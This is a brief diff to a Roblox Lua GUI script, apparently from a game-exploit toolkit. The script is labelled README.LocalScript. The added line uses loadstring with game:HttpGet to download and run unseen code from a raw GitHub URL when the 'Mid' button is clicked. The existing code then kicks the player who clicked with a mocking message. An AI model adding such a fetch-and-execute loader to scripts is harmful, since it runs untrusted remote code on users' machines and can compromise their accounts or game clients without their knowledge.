@@ -109,6 +109,7 @@ local function LVTPBYT_fake_script() -- README.LocalScript
 	if game.PlaceId == 100039707794702 then
 	local main = script.Parent.Frame
 	local midbutton = main.Mid.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sksnksnskakwkw/My-Script-Yes/refs/heads/main/Main-UFE-Script"))()
 		script.Parent:Destroy()
 		game.Players.LocalPlayer:Kick("L For Pressing Mid Button")
 	end)
